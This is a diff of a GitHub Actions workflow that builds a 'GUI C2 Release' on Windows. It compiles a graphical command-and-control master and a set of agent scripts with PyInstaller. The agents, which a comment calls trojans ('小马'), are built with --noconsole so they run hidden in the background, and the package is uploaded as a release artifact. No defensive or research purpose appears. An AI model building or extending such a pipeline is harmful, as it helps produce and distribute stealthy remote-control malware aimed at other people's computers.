@@ -1,10 +1,10 @@
-name: Build Complete All-In-One Release
+name: Build GUI C2 Release
 
 on: [push]
 
 jobs:
   build-windows:
-    name: Build All Masters, Agents and Assets for Windows
+    name: Build GUI Master and Agents for Windows
     runs-on: windows-latest
 
     steps:
@@ -21,34 +21,28 @@ jobs:
         python -m pip install --upgrade pip
         pip install pyinstaller
 
-    - name: Build all Python scripts (Masters & Agents)
+    - name: Build GUI Master and Agents
       run: |
         mkdir -p release_pack/executables
         
-        # 1. 编译所有客户端（agent开头的脚本）：带 --noconsole（无控制台，后台静默运行）
+        # 1. 编译刚刚创建的可视化主控端（带 --noconsole，生成好看的图形界面窗口）
+        pyinstaller --onefile --noconsole --distpath ./release_pack/executables app/c2_gui_master.py
+        
+        # 2. 编译所有客户端（小马）
         foreach ($file in Get-ChildItem -Path "app" -Filter "agent_*.py") {
-            Write-Host "Compiling Agent (No Console): $($file.Name)"
+            Write-Host "Compiling Agent: $($file.Name)"
             pyinstaller --onefile --noconsole --distpath ./release_pack/executables "app/$($file.Name)"
         }
-        
-        # 2. 编译所有主控端（c2_开头的脚本）：不带 --noconsole（保留控制台，支持交互和输入）
-        foreach ($file in Get-ChildItem -Path "app" -Filter "c2_*.py") {
-            Write-Host "Compiling Master (With Console): $($file.Name)"
-            pyinstaller --onefile --distpath ./release_pack/executables "app/$($file.Name)"
-        }
 
-    - name: Copy necessary assets and certificates
+    - name: Copy necessary assets
       run: |
         if (Test-Path "app/*.pem") {
             Copy-Item "app/*.pem" "release_pack/executables/"
         }
-        if (Test-Path "app/*.txt") {
-            Copy-Item "app/*.txt" "release_pack/executables/"
-        }
         Write-Host "Assets copied successfully."
 
-    - name: Upload complete release package
+    - name: Upload release package
       uses: actions/upload-artifact@v4
       with:
-        name: Complete-C2-Release-Package
+        name: GUI-C2-Release-Package
         path: release_pack/
